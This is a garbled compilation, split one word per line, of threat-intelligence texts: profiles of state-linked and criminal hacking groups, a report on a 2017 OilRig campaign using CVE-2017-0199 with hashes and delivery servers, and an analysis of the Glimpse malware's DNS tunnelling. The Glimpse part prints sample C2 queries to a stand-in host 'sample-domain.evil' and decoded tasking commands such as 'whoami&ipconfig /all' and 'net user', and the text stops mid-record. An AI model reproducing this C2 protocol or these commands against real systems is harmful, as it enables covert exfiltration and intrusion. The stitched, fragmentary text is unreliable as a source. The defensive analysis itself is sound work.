,
and
military
units
,
as
well
as
telecommunications
and
power
companies
.
 
Magic
Hound
is
an
Iranian-sponsored
threat
group
that
conducts
long
term
,
resource-intensive
cyber
espionage
operations
,
likely
on
behalf
of
the
Islamic
Revolutionary
Guard
Corps
.
 
They
have
targeted
European
,
U
.
 
S
.
 
,
and
Middle
Eastern
government
and
military
personnel
,
academics
,
journalists
,
and
organizations
such
as
the
World
Health
Organization
(WHO),
via
complex
social
engineering
campaigns
since
at
least
2014
.
 
menuPass
is
a
threat
group
that
has
been
active
since
at
least
2006
.
 
Individual
members
of
menuPass
are
known
to
have
acted
in
association
with
the
Chinese
Ministry
of
State
Security's
(MSS)
Tianjin
State
Security
Bureau
and
worked
for
the
Huaying
Haitai
Science
and
Technology
Development
Company
.
 
menuPass
has
targeted
healthcare
,
defense
,
aerospace
,
finance
,
maritime
,
biotechnology
,
energy
,
and
government
sectors
globally
,
with
an
emphasis
on
Japanese
organizations
.
 
In
2016
and
2017
,
the
group
is
known
to
have
targeted
managed
IT
service
providers
(MSPs),
manufacturing
and
mining
companies
,
and
a
university
.
 
Metador
is
a
suspected
cyber
espionage
group
that
was
first
reported
in
September
2022
.
 
Metador
has
targeted
a
limited
number
of
telecommunication
companies
,
internet
service
providers
,
and
universities
in
the
Middle
East
and
Africa
.
 
Security
researchers
named
the
group
Metador
based
on
the
"I
am
meta"
string
in
one
of
the
group's
malware
samples
and
the
expectation
of
Spanish-language
responses
from
C2
servers
.
 
Moafee
is
a
threat
group
that
appears
to
operate
from
the
Guandong
Province
of
China
.
 
Due
to
overlapping
TTPs
,
including
similar
custom
tools
,
Moafee
is
thought
to
have
a
direct
or
indirect
relationship
with
the
threat
group
DragonOK
.
 
Mofang
is
a
likely
China-based
cyber
espionage
group
,
named
for
its
frequent
practice
of
imitating
a
victim's
infrastructure
.
 
This
adversary
has
been
observed
since
at
least
May
2012
conducting
focused
attacks
against
government
and
critical
infrastructure
in
Myanmar
,
as
well
as
several
other
countries
and
sectors
including
military
,
automobile
,
and
weapons
industries
.
 
Molerats
is
an
Arabic-speaking
,
politically-motivated
threat
group
that
has
been
operating
since
2012
.
 
The
group's
victims
have
primarily
been
in
the
Middle
East
,
Europe
,
and
the
United
States
.
 
Moses
Staff
is
a
suspected
Iranian
threat
group
that
has
primarily
targeted
Israeli
companies
since
at
least
September
2021
.
 
Moses
Staff
openly
stated
their
motivation
in
attacking
Israeli
companies
is
to
cause
damage
by
leaking
stolen
sensitive
data
and
encrypting
the
victim's
networks
without
a
ransom
demand
.
 
Security
researchers
assess
Moses
Staff
is
politically
motivated
,
and
has
targeted
government
,
finance
,
travel
,
energy
,
manufacturing
,
and
utility
companies
outside
of
Israel
as
well
,
including
those
in
Italy
,
India
,
Germany
,
Chile
,
Turkey
,
the
UAE
,
and
the
US
.
 
MoustachedBouncer
is
a
cyberespionage
group
that
has
been
active
since
at
least
2014
targeting
foreign
embassies
in
Belarus
.
 
MuddyWater
is
a
cyber
espionage
group
assessed
to
be
a
subordinate
element
within
Iran's
Ministry
of
Intelligence
and
Security
(MOIS)
.
 
Since
at
least
2017
,
MuddyWater
has
targeted
a
range
of
government
and
private
organizations
across
sectors
,
including
telecommunications
,
local
government
,
defense
,
and
oil
and
natural
gas
organizations
,
in
the
Middle
East
,
Asia
,
Africa
,
Europe
,
and
North
America
.
 
Mustang
Panda
is
a
China-based
cyber
espionage
threat
actor
that
was
first
observed
in
2017
but
may
have
been
conducting
operations
since
at
least
2014
.
 
Mustang
Panda
has
targeted
government
entities
,
nonprofits
,
religious
,
and
other
non-governmental
organizations
in
the
U
.
 
S
.
 
,
Europe
,
Mongolia
,
Myanmar
,
Pakistan
,
and
Vietnam
,
among
others
.
 
Naikon
is
assessed
to
be
a
state-sponsored
cyber
espionage
group
attributed
to
the
Chinese
Peoples
Liberation
Armys
(PLA)
Chengdu
Military
Region
Second
Technical
Reconnaissance
Bureau
(Military
Unit
Cover
Designator
78020)
.
 
Active
since
at
least
2010
,
Naikon
has
primarily
conducted
operations
against
government
,
military
,
and
civil
organizations
in
Southeast
Asia
,
as
well
as
against
international
bodies
such
as
the
United
Nations
Development
Programme
(UNDP)
and
the
Association
of
Southeast
Asian
Nations
(ASEAN)
.
 
While
Naikon
shares
some
characteristics
with
APT30
,
the
two
groups
do
not
appear
to
be
exact
matches
.
 
NEODYMIUM
is
an
activity
group
that
conducted
a
campaign
in
May
2016
and
has
heavily
targeted
Turkish
victims
.
 
The
group
has
demonstrated
similarity
to
another
activity
group
called
PROMETHIUM
due
to
overlapping
victim
and
campaign
characteristics
.
 
NEODYMIUM
is
reportedly
associated
closely
with
BlackOasis
operations
,
but
evidence
that
the
group
names
are
aliases
has
not
been
identified
.
 
Nomadic
Octopus
is
a
Russian-speaking
cyber
espionage
threat
group
that
has
primarily
targeted
Central
Asia
,
including
local
governments
,
diplomatic
missions
,
and
individuals
,
since
at
least
2014
.
 
Nomadic
Octopus
has
been
observed
conducting
campaigns
involving
Android
and
Windows
malware
,
mainly
using
the
Delphi
programming
language
,
and
building
custom
variants
.
 
OilRig
is
a
suspected
Iranian
threat
group
that
has
targeted
Middle
Eastern
and
international
victims
since
at
least
2014
.
 
The
group
has
targeted
a
variety
of
sectors
,
including
financial
,
government
,
energy
,
chemical
,
and
telecommunications
.
 
It
appears
the
group
carries
out
supply
chain
attacks
,
leveraging
the
trust
relationship
between
organizations
to
attack
their
primary
targets
.
 
FireEye
assesses
that
the
group
works
on
behalf
of
the
Iranian
government
based
on
infrastructure
details
that
contain
references
to
Iran
,
use
of
Iranian
infrastructure
,
and
targeting
that
aligns
with
nation-state
interests
.
 
Orangeworm
is
a
group
that
has
targeted
organizations
in
the
healthcare
sector
in
the
United
States
,
Europe
,
and
Asia
since
at
least
2015
,
likely
for
the
purpose
of
corporate
espionage
.
 
Patchwork
is
a
cyber
espionage
group
that
was
first
observed
in
December
2015
.
 
While
the
group
has
not
been
definitively
attributed
,
circumstantial
evidence
suggests
the
group
may
be
a
pro-Indian
or
Indian
entity
.
 
Patchwork
has
been
seen
targeting
industries
related
to
diplomatic
and
government
agencies
.
 
Much
of
the
code
used
by
this
group
was
copied
and
pasted
from
online
forums
.
 
Patchwork
was
also
seen
operating
spearphishing
campaigns
targeting
U
.
 
S
.
 
think
tank
groups
in
March
and
April
of
2018
.
 
PittyTiger
is
a
threat
group
believed
to
operate
out
of
China
that
uses
multiple
different
types
of
malware
to
maintain
command
and
control
.
 
PLATINUM
is
an
activity
group
that
has
targeted
victims
since
at
least
2009
.
 
The
group
has
focused
on
targets
associated
with
governments
and
related
organizations
in
South
and
Southeast
Asia
.
 
POLONIUM
is
a
Lebanon-based
group
that
has
primarily
targeted
Israeli
organizations
,
including
critical
manufacturing
,
information
technology
,
and
defense
industry
companies
,
since
at
least
February
2022
.
 
Security
researchers
assess
POLONIUM
has
coordinated
their
operations
with
multiple
actors
affiliated
with
Irans
Ministry
of
Intelligence
and
Security
(MOIS),
based
on
victim
overlap
as
well
as
common
techniques
and
tooling
.
 
Poseidon
Group
is
a
Portuguese-speaking
threat
group
that
has
been
active
since
at
least
2005
.
 
The
group
has
a
history
of
using
information
exfiltrated
from
victims
to
blackmail
victim
companies
into
contracting
the
Poseidon
Group
as
a
security
firm
.
 
PROMETHIUM
is
an
activity
group
focused
on
espionage
that
has
been
active
since
at
least
2012
.
 
The
group
has
conducted
operations
globally
with
a
heavy
emphasis
on
Turkish
targets
.
 
PROMETHIUM
has
demonstrated
similarity
to
another
activity
group
called
NEODYMIUM
due
to
overlapping
victim
and
campaign
characteristics
.
 
Putter
Panda
is
a
Chinese
threat
group
that
has
been
attributed
to
Unit
61486
of
the
12th
Bureau
of
the
PLAs
3rd
General
Staff
Department
(GSD)
.
 
Rancor
is
a
threat
group
that
has
led
targeted
campaigns
against
the
South
East
Asia
region
.
 
Rancor
uses
politically-motivated
lures
to
entice
victims
to
open
malicious
documents
.
 
Rocke
is
an
alleged
Chinese-speaking
adversary
whose
primary
objective
appeared
to
be
cryptojacking
,
or
stealing
victim
system
resources
for
the
purposes
of
mining
cryptocurrency
.
 
The
name
Rocke
comes
from
the
email
address
"rocke@live
.
 
cn"
used
to
create
the
wallet
which
held
collected
cryptocurrency
.
 
Researchers
have
detected
overlaps
between
Rocke
and
the
Iron
Cybercrime
Group
,
though
this
attribution
has
not
been
confirmed
.
 
RTM
is
a
cybercriminal
group
that
has
been
active
since
at
least
2015
and
is
primarily
interested
in
users
of
remote
banking
systems
in
Russia
and
neighboring
countries
.
 
The
group
uses
a
Trojan
by
the
same
name
(RTM)
.
 
Sandworm
Team
is
a
destructive
threat
group
that
has
been
attributed
to
Russia's
General
Staff
Main
Intelligence
Directorate
(GRU)
Main
Center
for
Special
Technologies
(GTsST)
military
unit
74455
.
 
This
group
has
been
active
since
at
least
2009
.
 
In
October
2020
,
the
US
indicted
six
GRU
Unit
74455
officers
associated
with
Sandworm
Team
for
the
following
cyber
operations:
the
2015
and
2016
attacks
against
Ukrainian
electrical
companies
and
government
organizations
,
the
2017
worldwide
NotPetya
attack
,
targeting
of
the
2017
French
presidential
campaign
,
the
2018
Olympic
Destroyer
attack
against
the
Winter
Olympic
Games
,
the
2018
operation
against
the
Organisation
for
the
Prohibition
of
Chemical
Weapons
,
and
attacks
against
the
country
of
Georgia
in
2018
and
2019
.
 
Some
of
these
were
conducted
with
the
assistance
of
GRU
Unit
26165
,
which
is
also
referred
to
as
APT28
.
 
Scarlet
Mimic
is
a
threat
group
that
has
targeted
minority
rights
activists
.
 
This
group
has
not
been
directly
linked
to
a
government
source
,
but
the
group's
motivations
appear
to
overlap
with
those
of
the
Chinese
government
.
 
While
there
is
some
overlap
between
IP
addresses
used
by
Scarlet
Mimic
and
Putter
Panda
,
it
has
not
been
concluded
that
the
groups
are
the
same
.
 
Scattered
Spider
is
a
cybercriminal
group
that
has
been
active
since
at
least
2022
targeting
customer
relationship
management
and
business-process
outsourcing
(BPO)
firms
as
well
as
telecommunications
and
technology
companies
.
 
During
campaigns
Scattered
Spider
has
leveraged
targeted
social-engineering
techniques
and
attempted
to
bypass
popular
endpoint
security
tools
.
 
SideCopy
is
a
Pakistani
threat
group
that
has
primarily
targeted
South
Asian
countries
,
including
Indian
and
Afghani
government
personnel
,
since
at
least
2019
.
 
SideCopy's
name
comes
from
its
infection
chain
that
tries
to
mimic
that
of
Sidewinder
,
a
suspected
Indian
threat
group
.
 
Sidewinder
is
a
suspected
Indian
threat
actor
group
that
has
been
active
since
at
least
2012
.
 
They
have
been
observed
targeting
government
,
military
,
and
business
entities
throughout
Asia
,
primarily
focusing
on
Pakistan
,
China
,
Nepal
,
and
Afghanistan
.
 
Silence
is
a
financially
motivated
threat
actor
targeting
financial
institutions
in
different
countries
.
 
The
group
was
first
seen
in
June
2016
.
 
Their
main
targets
reside
in
Russia
,
Ukraine
,
Belarus
,
Azerbaijan
,
Poland
and
Kazakhstan
.
 
They
compromised
various
banking
systems
,
including
the
Russian
Central
Bank's
Automated
Workstation
Client
,
ATMs
,
and
card
processing
.
 
Silent
Librarian
is
a
group
that
has
targeted
research
and
proprietary
data
at
universities
,
government
agencies
,
and
private
sector
companies
worldwide
since
at
least
2013
.
 
Members
of
Silent
Librarian
are
known
to
have
been
affiliated
with
the
Iran-based
Mabna
Institute
which
has
conducted
cyber
intrusions
at
the
behest
of
the
government
of
Iran
,
specifically
the
Islamic
Revolutionary
Guard
Corps
(IRGC)
.
 
SilverTerrier
is
a
Nigerian
threat
group
that
has
been
seen
active
since
2014
.
 
SilverTerrier
mainly
targets
organizations
in
high
technology
,
higher
education
,
and
manufacturing
.
 
Sowbug
is
a
threat
group
that
has
conducted
targeted
attacks
against
organizations
in
South
America
and
Southeast
Asia
,
particularly
government
entities
,
since
at
least
2015
.
 
Stealth
Falcon
is
a
threat
group
that
has
conducted
targeted
spyware
attacks
against
Emirati
journalists
,
activists
,
and
dissidents
since
at
least
2012
.
 
Circumstantial
evidence
suggests
there
could
be
a
link
between
this
group
and
the
United
Arab
Emirates
(UAE)
government
,
but
that
has
not
been
confirmed
.
 
Strider
is
a
threat
group
that
has
been
active
since
at
least
2011
and
has
targeted
victims
in
Russia
,
China
,
Sweden
,
Belgium
,
Iran
,
and
Rwanda
.
 
Suckfly
is
a
China-based
threat
group
that
has
been
active
since
at
least
2014
.
 
TA2541
is
a
cybercriminal
group
that
has
been
targeting
the
aviation
,
aerospace
,
transportation
,
manufacturing
,
and
defense
industries
since
at
least
2017
.
 
TA2541
campaigns
are
typically
high
volume
and
involve
the
use
of
commodity
remote
access
tools
obfuscated
by
crypters
and
themes
related
to
aviation
,
transportation
,
and
travel
.
 
TA459
is
a
threat
group
believed
to
operate
out
of
China
that
has
targeted
countries
including
Russia
,
Belarus
,
Mongolia
,
and
others
.
 
TA505
is
a
cyber
criminal
group
that
has
been
active
since
at
least
2014
.
 
TA505
is
known
for
frequently
changing
malware
,
driving
global
trends
in
criminal
malware
distribution
,
and
ransomware
campaigns
involving
Clop
.
 
TA551
is
a
financially-motivated
threat
group
that
has
been
active
since
at
least
2018
.
 
The
group
has
primarily
targeted
English
,
German
,
Italian
,
and
Japanese
speakers
through
email-based
malware
distribution
campaigns
.
 
TeamTNT
is
a
threat
group
that
has
primarily
targeted
cloud
and
containerized
environments
.
 
The
group
as
been
active
since
at
least
October
2019
and
has
mainly
focused
its
efforts
on
leveraging
cloud
and
container
resources
to
deploy
cryptocurrency
miners
in
victim
environments
.
 
TEMP
.
 
Veles
is
a
Russia-based
threat
group
that
has
targeted
critical
infrastructure
.
 
The
group
has
been
observed
utilizing
TRITON
,
a
malware
framework
designed
to
manipulate
industrial
safety
systems
.
 
The
White
Company
is
a
likely
state-sponsored
threat
actor
with
advanced
capabilities
.
 
From
2017
through
2018
,
the
group
led
an
espionage
campaign
called
Operation
Shaheen
targeting
government
and
military
organizations
in
Pakistan
.
 
Threat
Group-1314
is
an
unattributed
threat
group
that
has
used
compromised
credentials
to
log
into
a
victim's
remote
access
infrastructure
.
 
Threat
Group-3390
is
a
Chinese
threat
group
that
has
extensively
used
strategic
Web
compromises
to
target
victims
.
 
The
group
has
been
active
since
at
least
2010
and
has
targeted
organizations
in
the
aerospace
,
government
,
defense
,
technology
,
energy
,
manufacturing
and
gambling/betting
sectors
.
 
Thrip
is
an
espionage
group
that
has
targeted
satellite
communications
,
telecoms
,
and
defense
contractor
companies
in
the
U
.
 
S
.
 
and
Southeast
Asia
.
 
The
group
uses
custom
malware
as
well
as
"living
off
the
land"
techniques
.
 
Tonto
Team
is
a
suspected
Chinese
state-sponsored
cyber
espionage
threat
group
that
has
primarily
targeted
South
Korea
,
Japan
,
Taiwan
,
and
the
United
States
since
at
least
2009
;
by
2020
they
expanded
operations
to
include
other
Asian
as
well
as
Eastern
European
countries
.
 
Tonto
Team
has
targeted
government
,
military
,
energy
,
mining
,
financial
,
education
,
healthcare
,
and
technology
organizations
,
including
through
the
Heartbeat
Campaign
(2009-2012)
and
Operation
Bitter
Biscuit
(2017)
.
 
Transparent
Tribe
is
a
suspected
Pakistan-based
threat
group
that
has
been
active
since
at
least
2013
,
primarily
targeting
diplomatic
,
defense
,
and
research
organizations
in
India
and
Afghanistan
.
 
Tropic
Trooper
is
an
unaffiliated
threat
group
that
has
led
targeted
campaigns
against
targets
in
Taiwan
,
the
Philippines
,
and
Hong
Kong
.
 
Tropic
Trooper
focuses
on
targeting
government
,
healthcare
,
transportation
,
and
high-tech
industries
and
has
been
active
since
2011
.
 
Turla
is
a
cyber
espionage
threat
group
that
has
been
attributed
to
Russia's
Federal
Security
Service
(FSB)
.
 
They
have
compromised
victims
in
over
50
countries
since
at
least
2004
,
spanning
a
range
of
industries
including
government
,
embassies
,
military
,
education
,
research
and
pharmaceutical
companies
.
 
Turla
is
known
for
conducting
watering
hole
and
spearphishing
campaigns
,
and
leveraging
in-house
tools
and
malware
,
such
as
Uroburos
.
 
Volatile
Cedar
is
a
Lebanese
threat
group
that
has
targeted
individuals
,
companies
,
and
institutions
worldwide
.
 
Volatile
Cedar
has
been
operating
since
2012
and
is
motivated
by
political
and
ideological
interests
.
 
Volt
Typhoon
is
a
People's
Republic
of
China
(PRC)
state-sponsored
actor
that
has
been
active
since
at
least
2021
.
 
Volt
Typhoon
typically
focuses
on
espionage
and
information
gathering
and
has
targeted
critical
infrastructure
organizations
in
the
US
including
Guam
.
 
Volt
Typhoon
has
emphasized
stealth
in
operations
using
web
shells
,
living-off-the-land
(LOTL)
binaries
,
hands
on
keyboard
activities
,
and
stolen
credentials
.
 
Whitefly
is
a
cyber
espionage
group
that
has
been
operating
since
at
least
2017
.
 
The
group
has
targeted
organizations
based
mostly
in
Singapore
across
a
wide
variety
of
sectors
,
and
is
primarily
interested
in
stealing
large
amounts
of
sensitive
information
.
 
The
group
has
been
linked
to
an
attack
against
Singapores
largest
public
health
organization
,
SingHealth
.
 
The
Windigo
group
has
been
operating
since
at
least
2011
,
compromising
thousands
of
Linux
and
Unix
servers
using
the
Ebury
SSH
backdoor
to
create
a
spam
botnet
.
 
Despite
law
enforcement
intervention
against
the
creators
,
Windigo
operators
continued
updating
Ebury
through
2019
.
 
Windshift
is
a
threat
group
that
has
been
active
since
at
least
2017
,
targeting
specific
individuals
for
surveillance
in
government
departments
and
critical
infrastructure
across
the
Middle
East
.
 
Winnti
Group
is
a
threat
group
with
Chinese
origins
that
has
been
active
since
at
least
2010
.
 
The
group
has
heavily
targeted
the
gaming
industry
,
but
it
has
also
expanded
the
scope
of
its
targeting
.
 
Some
reporting
suggests
a
number
of
other
groups
,
including
Axiom
,
APT17
,
and
Ke3chang
,
are
closely
linked
to
Winnti
Group
.
 
WIRTE
is
a
threat
group
that
has
been
active
since
at
least
August
2018
.
 
WIRTE
has
targeted
government
,
diplomatic
,
financial
,
military
,
legal
,
and
technology
organizations
in
the
Middle
East
and
Europe
.
 
Wizard
Spider
is
a
Russia-based
financially
motivated
threat
group
originally
known
for
the
creation
and
deployment
of
TrickBot
since
at
least
2016
.
 
Wizard
Spider
possesses
a
diverse
aresenal
of
tools
and
has
conducted
ransomware
campaigns
against
a
variety
of
organizations
,
ranging
from
major
corporations
to
hospitals
.
 
ZIRCONIUM
is
a
threat
group
operating
out
of
China
,
active
since
at
least
2017
,
that
has
targeted
individuals
associated
with
the
2020
US
presidential
election
and
prominent
leaders
in
the
international
affairs
community
From
April
19-24
,
2017
,
a
politically-motivated
,
targeted
campaign
was
carried
out
against
numerous
Israeli
organizations
.
 
Morphisec
researchers
began
investigating
the
attacks
on
April
24
and
continue
to
uncover
more
details
.
 
Initial
reports
of
the
attacks
,
published
April
26
(
in
Hebrew
)
by
the
Israel
National
Cyber
Event
Readiness
Team
(
CERT-IL
)
and
The
Marker
,
confirm
that
the
attack
was
delivered
through
compromised
email
accounts
at
Ben-Gurion
University
and
sent
to
multiple
targets
across
Israel
.
 
Ironically
,
Ben-Gurion
University
is
home
to
Israel
s
Cyber
Security
Research
Center
.
 
Investigators
put
the
origin
of
the
attack
as
Iranian
;
Morphisec
s
research
supports
this
conclusion
and
attributes
the
attacks
to
the
same
infamous
hacker
group
responsible
for
the
OilRig
malware
campaigns
.
 
The
fileless
attack
was
delivered
via
Microsoft
Word
documents
that
exploited
a
former
zero-day
vulnerability
in
Word
,
CVE-2017-0199
,
to
install
a
fileless
attack
variant
of
the
Helminth
Trojan
agent
.
 
Microsoft
released
the
patch
for
the
vulnerability
on
April
11
,
but
many
organizations
have
not
yet
deployed
the
update
.
 
The
attackers
actually
based
their
attack
on
an
existing
Proof-of-Concept
method
that
was
published
by
researchers
after
the
patch
release
.
 
By
hunting
through
known
malware
repositories
,
Morphisec
identified
matching
samples
uploaded
by
Israeli
high-tech
development
companies
,
medical
organizations
and
education
organizations
,
indicating
that
they
were
victims
of
the
attack
.
 
For
security
purposes
,
Morphisec
is
not
revealing
these
names
.
 
Upon
deeper
investigation
into
the
installed
Helminth
fileless
agent
,
we
identified
a
near
perfect
match
to
the
OilRig
campaign
executed
by
an
Iranian
hacker
group
against
140
financial
institutions
in
the
Middle
East
last
year
,
as
analyzed
by
FireEye
,
Palo
Alto
Networks
and
Logrhythm
.
 
This
group
has
become
one
of
the
most
active
threat
actors
,
with
noteworthy
abilities
,
resources
and
infrastructure
;
speculations
indicate
the
hacking
organization
to
be
sponsored
by
the
Iranian
government
.
 
In
other
recent
attacks
(
January
2017
)
,
the
group
used
a
fake
Juniper
Networks
VPN
portal
and
fake
University
of
Oxford
websites
to
deliver
malware
as
described
by
ClearSky
.
 
Name
SHA256
.
 
13.doc
:
a9bbbf5e4797d90d579b2cf6f9d61443dff82ead9d9ffd10f3c31b686ccf81ab
.
 
558.doc
,
2.doc:
2869664d456034a611b90500f0503d7d6a64abf62d9f9dd432a8659fa6659a84
.
 
1.doc
:
832cc791aad6462687e42e40fd9b261f3d2fbe91c5256241264309a5d437e4d8
.
 
3.doc
:
d4eb4035e11da04841087a181c48cd85f75c620a84832375925e6b03973d8e48
.
 
The
most
notable
difference
from
last
year
s
OilRig
campaign
is
the
way
the
attack
was
delivered
.
 
In
the
previous
campaign
,
the
Iranian
group
sent
specially
crafted
Excel
and
Word
files
,
which
contained
macros
that
targeted
individuals
were
convinced
to
enable
.
 
Name
Delivery
Server
.
 
test4.hta
http://comonscar.in
(
82.145.40.46
)
.
 
test5.hta
80.82.67.42
.
 
test1.hta
reserved
.
 
SHA256:
5ac61ea5142d53412a251eb77f2961e3334a00c83da9087d355a49618220ac43
.
 
Name
SHA256
.
 
0011.ps1
042F60714E9347DB422E1A3A471DC0301D205FFBD053A4015D2B509DB92029D1
.
 
1.vbs
BE7F1D411CC4160BB221C7181DA4370972B6C867AF110C12850CAD77981976ED
.
 
A
Glimpse
into
Glimpse
For
the
second
blog
post
in
our
series,
the
IronNet
Threat
Research
Team
examines
the
Glimpse
malware
that
is
written
in
PowerShell
and
has
been
associated
with
OilRig
APT34
.
 
Our
first
post
about
analyzing
malware
with
DNS
tunneling
capabilities
focuses
on
how
the
PoisonFrog
malware
uses
DNS
tunneling
to
send
and
receive
victim
information
and
commands
.
 
Glimpse
:
6e86c57385d26a59c0df1580454b9967
.
 
Glimpse
is
a
PowerShell
script
that
is
executed
silently
by
Visual
Basic
script
.
 
Based
on
the
code,
it
is
unclear
what
initiates
the
Visual
Basic
script
itself
.
 
However,
a
variety
of
typical
persistence
mechanisms,
such
as
a
scheduled
task,
could
serve
that
purpose
.
 
After
Glimpse
starts,
it
checks
for
the
existence
of
a
directory
and
lock
file
.
 
If
no
directory
or
lock
file
is
found,
Glimpse
creates
one
.
 
Alternatively,
if
these
do
exist
and
the
lock
file
is
older
than
10
minutes,
the
lock
file
is
deleted
and
the
previously
running
Glimpse
script
is
killed
.
 
After
the
initial
checks
described
above,
Glimpse
creates
a
hidden
file
that
contains
an
agent
ID,
which
is
a
simple
concatenation
of
a
random
number
10-99
and
the
first
8
characters
of
a
GUID
without
dashes
.
 
The
methods
employed
by
Glimpse
to
perform
DNS
communications
are
determined
by
the
mode
in
which
it
is
operating
(i.e.,
text
mode
or
ping
mode
)
.
 
In
text
mode,
Glimpse
manually
builds
a
DNS
query
to
be
transmitted
over
a
UDP
socket
.
 
In
ping
mode,
Glimpse
uses
a
.NET
method
.
 
The
table
below
describes
the
operational
mode,
record
types
used,
and
the
method
used
to
send
the
query
.
 
The
first
DNS
query
by
Glimpse
requests
the
mode
to
be
used
in
future
communications
with
the
controller
(i.e.,
ping
mode
or
text
mode
)
.
 
Prior
to
making
any
query,
a
function
called
AdrGen
is
used
to
build
a
query
string
.
 
This
function
takes
several
parameters,
most
of
which
are
represented
in
the
subdomain
label(s)
of
the
query
string
.
 
Below
is
a
list
of
AdrGen
parameters
.
 
As
mentioned
above,
one
of
the
parameters
passed
to
the
AdrGen
function
is
the
action
parameter
.
 
Table
5:
Glimpse
action
parameters
values
for
the
AdrGen
function
below
contains
the
possible
parameters,
a
brief
description,
and
return
values
applicable
to
the
action
parameter
.
 
The
query
to
set
the
receive
mode
expects
an
A
resource
record
response
from
the
controller
.
 
The
controller
will
respond
with
one
of
two
responses:
99.250.250.199
will
set
the
receive
mode
to
text
.
 
Any
other
IP
address
will
set
the
receive
mode
to
ping,
although
the
server-side
software
suggests
199.250.250.99
will
be
sent
.
 
When
set
in
text
receive
mode,
the
malware
uses
the
AdrGen
function
to
create
another
query
string
with
the
r
(receiver)
flag
and
a
W
(wait)
action
parameter
.
 
The
expected
TXT
record
response
has
the
following
structure:
command>data
.
 
In
our
sample
traffic,
the
TXT
resource
record
returned
contained:
S000s>10100
.
 
This
response
tells
the
malware
to
set
a
variable
for
the
file
name
to
receivebox\rcvd10100
and
set
the
next
query
action
to
D
in
order
to
request
the
next
chunk
of
data
.
 
The
malware
sends
another
TXT
query
with
the
receiver
structure
.
 
This
query
is
depicted
below:
39e9D60005eca60000BCC64T.sample-domain.evil
In
the
case
of
our
sample
traffic,
the
server
responded
with
the
following
TXT
resource
record
data:
S0000>d2hvYW1pJmlwY29uZmlnIC9hbGw
.
 
The
controller
provided
the
malware
with
base64-encoded
data
to
be
decoded
.
 
The
data
will
eventually
be
written
to
disk
and
the
malware
sets
the
next
query
action
to
D
in
order
to
request
the
next
chunk
of
data
.
 
The
decoded
data
shows
a
command
to
be
executed
whoami&ipconfig
/all
on
the
victim
system
.
 
The
malware
sends
another
TXT
query
with
the
receiver
structure,
as
depicted
below
.
 
Note
the
request
number
parameter
is
now
0001:
39e965e000caD60001679C79T.sample-domain.evil
.
 
The
TXT
record
returned
contained
data:
E0000>0
.
 
The
controller
issued
the
command
to
write
the
base64-decoded
and
modified
data
to
the
file
name
set
earlier
in
the
exchange
.
 
After
the
file
is
written,
the
malware
moves
on
to
process
operations
.
 
Glimpse
can
be
set
to
use
ping
mode
in
several
ways
while
performing
receive
operations
.
 
If
a
query
with
the
M
action
returns
an
IP
address
that
is
not
99.250.250.199
,
the
malware
will
use
ping
mode
.
 
It
is
worth
noting
that
the
IP
response
observed
to
set
ping
mode
was
the
reverse
of
the
IP
used
to
set
text
mode
(i.e.,
199.250.250.99
)
.
 
Ping
mode
will
also
be
set
if
exceptions
occur
more
than
three
times
during
text
mode
.
 
In
the
latter
case,
the
P
action
is
passed
as
one
of
the
parameters
to
AdrGen
and
the
query
is
made
for
an
A
resource
record
using
the
[System.Net.Dns]::GetHostAddresses
method
.
 
If
performing
receive
operations
in
ping
mode,
Glimpse
makes
a
query
with
the
0
action
to
contact
the
controller
for
tasking
.
 
This
query
uses
a
receive
structure
similar
to
an
M
action;
it
is
worth
noting
all
of
the
receiver
operation
queries
made
in
ping
mode
use
the
[System.Net.Dns]::GetHostAddresses
method
.
 
In
our
sample,
after
the
malware
sent
the
0
action,
the
controller
responded
with
an
A
record
containing
24.125.10.140
.
 
This
response
tells
the
malware
to:
Set
the
file
name
for
the
data
that
will
follow
to
10140,
Set
the
part
number
to
0,
Parse
response
data,
Set
a
1
action
for
the
next
query
.
 
Query:
00039e9650eca66C06T.sample-domain.evil
,
Response:
24.125.10.140
,
File
name:
10140,
Query:
139e965e000ca6D2C80T.sample-domain.evil
,
Response:
110.101.116.0
,
Query:
00339e965e1ca6EF4C07T.sample-domain.evil
,
Response:
32.117.115.3
,
Query:
30069e
1965eca6FE8C13T.sample-domain.evil,
Response:
101.114.32.6
,
Query:
391
e960095eca63570BC62T.sample-domain.evil
,
Response:
1.2.3.0
.
 
In
this
case,
the
content
net
user
is
written
to
rcvd10140
.
 
After
writing
the
data
to
disk,
receiver
operations
are
complete
and
processor
operations
begin
.
 
After
writing
the
data
received
from
the
controller,
a
function
is
called
to
process
the
received
file
.
 
The
processor
function
builds
a
list
of
files
from
the
files
with
content
that
match
rcvd*
in
the
receivebox
directory
.
 
Similar
to
PoisonFrog
,
the
last
digit
of
the
received
file
name
determines
how
the
content
of
the
file
is
processed
.
 
In
our
sample
traffic,
after
executing
the
commands
sent
via
cmd.exe
,
Glimpse
writes
the
output
of
the
commands
in
the
sendbox
directory
to
the
appropriate
file
names
(e.g.,
10100
or
10140)
prepended
with
proc
(e.g.,
proc10100
)
.
 
Once
written,
the
send
operations
begin
.
 
Similar
to
text
mode
receiver,
after
AdrGen
builds
the
string,
a
function
to
manually
build
and
send
the
DNS
query
packet
is
called
.
 
The
text
mode
sender
uses
the
same
hardcoded
transaction
ID
0xa4a3;
however,
instead
of
sending
queries
for
TXT
resource
records,
the
malware
uses
A
resource
records
.
 
As
with
the
text
mode
receiver,
the
query
is
made
with
a
direct
connection
to
the
controller
IP
address
as
opposed
to
allowing
the
query
to
propagate
the
native
DNS
architecture
.
 
If
the
send
function
is
being
invoked
in
ping
mode,
the
process
described
above
is
followed;
however,
instead
of
manually
building
and
transmitting
the
DNS
query,
the
[System.Net.Dns]::GetHostAddresses
method
is
used
.
 
With
that
method,
the
malwares
query
will
traverse
the
native
DNS
architecture
as
opposed
to
the
victim
making
a
direct
connection
to
the
controller
.
 
The
send
function
uses
several
counters
to
maintain
various
pieces
of
information
used
to
control
the
flow
of
execution
.
 
An
exception
counter
is
used
to
track
the
number
of
exceptions
and
will
exit
the
send
loop
if
a
threshold
is
hit
.
 
The
send
counter
is
used
to
track
the
number
of
chunks
sent
to
the
controller
.
 
An
additional
counter
exists
to
handle
cases
where
the
file
being
sent
is
larger
than
250
chunks
.
 
The
send
counter
is
initialized
to
0
and
read
from
the
fourth
octet
of
the
A
record
returned
by
the
controller
.
 
The
send
counter
is
also
passed
to
the
AdrGen
function
as
the
part
number
parameter
and
is
visible
in
the
query
string
as
depicted
below:
Query:
239e965ec000a60000B6C90T.COCTab33333233332222222222222222210100A3280AAAAAAAAAAAAAAAAA.33333210100A.sample-domain.evil
,
Response:
39.2.3.1
,
Query:
